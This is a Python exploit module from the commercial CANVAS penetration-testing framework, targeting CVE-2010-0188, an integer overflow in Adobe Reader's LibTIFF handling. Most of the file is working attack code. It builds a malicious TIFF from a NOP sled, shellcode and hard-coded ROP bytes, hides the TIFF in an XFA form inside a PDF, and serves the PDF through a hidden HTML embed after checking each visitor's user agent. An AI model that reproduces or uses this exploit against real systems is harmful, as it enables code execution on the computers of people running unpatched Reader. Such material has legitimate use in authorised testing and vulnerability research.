#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct
import copy

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside
from encoder import chunkedaddencoder
from libs.ua_parser import user_agent_parser

NAME='Adobe Acrobat Reader LibTIFF Integer Overflow'
DESCRIPTION='Adobe Acrobat Reader LibTIFF Integer Overflow'

DOCUMENTATION={}
DOCUMENTATION['Date public']='02/16/2010'
DOCUMENTATION['References']='http://www.adobe.com/support/security/bulletins/apsb10-07.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Acrobat Reader <=9.3.0'
DOCUMENTATION['CVE Name']='CVE-2010-0188'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0188"
DOCUMENTATION["Notes"]="""

"""

VERSION='0.1'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['VENDOR']='Adobe'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on Windows XP Professional SP3 English/Spanish with Adobe Acrobat Reader 9.3.0

Usage:
    ./commandlineInterface.py -p 5555 -v 1
    ./exploits/httpserver/httpserver.py -v 1 -O singleexploit:acrobat_libtiff -l 172.17.1.1 -d 5555 -p 8080  
"""

CHANGELOG="""
"""

DEBUGNOTES="""
"""

targets={
    0: ['Autodetect',0],
}

import re
import base64
from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *

SHELLCODE_OFFSET=0x555
TIFF_OFFSET=0x2038


class theexploit(httpclientside):

    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=1
        self.badstring='\0\xff'
        self.name=NAME
        self.htmlfilename='file.html'
        self.refresh_rate=300
        self.port			= 5555
        self.source_pdf     = 'Resources/blank.pdf'
        self.dest_pdf       = 'output.pdf'
        self.raw_xml		= '''<?xml version="1.0" encoding="UTF-8" ?> 
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/1.0/">
<present>
<pdf><version>1.65</version> 
<interactive>1</interactive> 
<linearized>1</linearized> 
</pdf>
<xdp>
<packets>*</packets> 
</xdp>
<destination>pdf</destination> 
</present>
</config>
<template baseProfile="interactiveForms">
<subform name="Subform" layout="tb" locale="en_US">
<pageSet>
<pageArea id="PageArea1" name="PageArea1">
<contentArea name="ContentArea1" x="0pt" y="0pt" w="100pt" h="100pt" /> 
<medium short="500pt" long="500pt" stock="custom" /> 
</pageArea>
</pageSet>
<subform name="Page1" x="0pt" y="0pt" w="100pt" h="100pt">
<break before="pageArea" beforeTarget="#PageArea1" /> 
<bind match="none" /> 
<field name="ImageField1">
<ui>
<imageEdit /> 
</ui>
</field>
</subform>
</subform>
</template>
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
<xfa:data>
<Subform>
<ImageField1 xfa:contentType="image/tif" href=""> TIFF </ImageField1> 
</Subform>
</xfa:data>
</xfa:datasets>
<form xmlns="http://www.xfa.org/schema/xfa-form/2.8/">
<subform name="Subform">
<instanceManager name="_Page1" /> 
<subform name="Page1">
<field name="ImageField1" /> 
</subform>
<pageSet>
<pageArea name="PageArea1" /> 
</pageSet>
</subform>
</form>
</xdp:xdp>

'''
        return


    def gen_tiff(self,shellcode):

        tiff =  '\x49\x49\x2a\x00'
        tiff += struct.pack("<L", TIFF_OFFSET)
        tiff += '\x90' * (SHELLCODE_OFFSET)
        tiff += shellcode
        tiff += '\x90' * (TIFF_OFFSET - 8 - len(shellcode) - SHELLCODE_OFFSET)
        tiff += "\x07\x00\x00\x01\x03\x00\x01\x00"
        tiff += "\x00\x00\x30\x20\x00\x00\x01\x01\x03\x00\x01\x00\x00\x00\x01\x00"
        tiff += "\x00\x00\x03\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x01"
        tiff += "\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x11\x01\x04\x00\x01\x00"
        tiff += "\x00\x00\x08\x00\x00\x00\x17\x01\x04\x00\x01\x00\x00\x00\x30\x20"
        tiff += "\x00\x00\x50\x01\x03\x00\xCC\x00\x00\x00\x92\x20\x00\x00\x00\x00"
        tiff += "\x00\x00\x00\x0C\x0C\x08\x24\x01\x01\x00\x1E\x73\x00\x07\x04\x01"
        tiff += "\x01\x00\xBB\x15\x00\x07\x00\x10\x00\x00\x4D\x15\x00\x07\xBB\x15"
        tiff += "\x00\x07\x00\x03\xFE\x7F\xB2\x7F\x00\x07\xBB\x15\x00\x07\x11\x00"
        tiff += "\x01\x00\xAC\xA8\x00\x07\xBB\x15\x00\x07\x00\x01\x01\x00\xAC\xA8"
        tiff += "\x00\x07\x1E\x73\x00\x07\x11\x00\x01\x00\xE2\x52\x00\x07\x54\x5C"
        tiff += "\x00\x07\xFF\xFF\xFF\xFF\x00\x01\x01\x00\x00\x00\x00\x00\x04\x01"
        tiff += "\x01\x00\x00\x10\x00\x00\x40\x00\x00\x00\x31\xD7\x00\x07\xBB\x15"
        tiff += "\x00\x07\x5A\x52\x6A\x02\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\x58\xCD\x2E\x3C\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\x05\x5A\x74\xF4\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\xB8\x49\x49\x2A\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\x00\x8B\xFA\xAF\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\x75\xEA\x87\xFE\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\xEB\x0A\x5F\xB9\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\xE0\x03\x00\x00\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\xF3\xA5\xEB\x09\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\xE8\xF1\xFF\xFF\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\xFF\x90\x90\x90\x4D\x15\x00\x07\x22\xA7\x00\x07\xBB\x15"
        tiff += "\x00\x07\xFF\xFF\xFF\x90\x4D\x15\x00\x07\x31\xD7\x00\x07\x2F\x11"
        tiff += "\x00\x07"

        return base64.b64encode(tiff)


    def is_vulnerable(self, info_dict):
        major, minor, build, patch = self.getReaderVersions(info_dict)
        if not major:
            self.log("No Acrobat Reader available to target")
            return 0

        parsed = user_agent_parser.Parse(info_dict['user_agent'])
        if 'Windows' not in parsed['os']['family']:
            self.log("Target not running Windows")
            return 0

        if major == 9:
            if minor <= 3:
                if build == 0:
                    return 70
        return 0

    def makePDF(self):

        input = PdfFileReader(file(self.source_pdf,'rb'))
        page=input.getPage(0)
        #4 0 obj
        obj4 = CreateIndirectObject()
        obj4[NameObject('/FT')] = NameObject('/Btn')
        obj4[NameObject('/TU')] = TextStringObject("ImageField1")
        obj4[NameObject('/Ff')] = NumberObject(65536)
        obj4[NameObject('/Subtype')] = NameObject("/Widget")
        obj4[NameObject('/T')] = NameObject("(ImageField1[0])")
        obj4[NameObject('/Rect')] = ArrayObject((FloatObject("100.0"),FloatObject("100.0"),FloatObject("100.0"),FloatObject("100.0")))

        #3 0 obj
        obj3 = CreateIndirectObject()
        obj3[NameObject("/Kids")] = ArrayObject()
        obj3[NameObject("/Kids")].append(obj4)
        obj3[NameObject("/T")] = NameObject('(Page1[0])')

        #2 0 obj
        obj2 = CreateIndirectObject()
        obj2[NameObject("/T")] = NameObject('(Subform[0])')
        obj2[NameObject("/Kids")] = ArrayObject()
        obj2[NameObject("/Kids")].append(obj3)

        #XML form
        xml=StreamObject()
        xml._data=self.raw_xml
        xml=xml.flateEncode()
        xml[NameObject("/Type")]=NameObject("/EmbeddedFile") 


        input.trailer['/Root'][NameObject("/AcroForm")] = DictionaryObject()   
        input.trailer['/Root']['/AcroForm'][NameObject('/Fields')] = ArrayObject()        
        input.trailer['/Root']['/AcroForm'][NameObject('/Fields')].append(obj2)

        input.trailer['/Root']['/AcroForm'][NameObject('/XFA')] = ArrayObject()
        input.trailer['/Root']['/AcroForm']['/XFA'].append(TextStringObject("template"))
        input.trailer['/Root']['/AcroForm']['/XFA'].append(xml)

        self.raw_xml = self.raw_xml.replace("TIFF",(self.gen_tiff(self.shellcode)))
        self.writeOutput(input, self.dest_pdf)

        return file(self.dest_pdf,'rb').read()


    def writeOutput(self,input, filename):
        page=input.getPage(0)
        output=PdfFileWriter()
        output.addPage(page)
        root=output._root.getObject()
        output._root=input.trailer['/Root']
        output.write(file(filename,'wb'))

        return


    def makeHTML(self):
        #No redirect timeout here because when exploit fails it crashes the browser
        webpage="<HTML>\n"
        webpage+="<EMBED src=\"%s\" HIDDEN=\"TRUE\" ></EMBED>\n"%(self.dest_pdf)
        webpage+="</HTML>\n"
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            h.addHeader('Content-Type','application/pdf')
            self.createShellcode()
            b.setBody(self.makePDF())
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def getArgs(self):

        self.host=self.target.interface
        self.source_pdf=self.argsDict.get('source_filename',self.source_pdf)
        self.dest_pdf=self.argsDict.get('dest_filename', self.dest_pdf)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):

        self.getArgs()
        self.raw_xml = self.raw_xml.replace("TIFF",(self.gen_tiff(self.shellcode)))
        self.makePDF()
        self.log('Opening %s for output'%(self.dest_pdf))
        self.log('Wrote to %s'%(self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
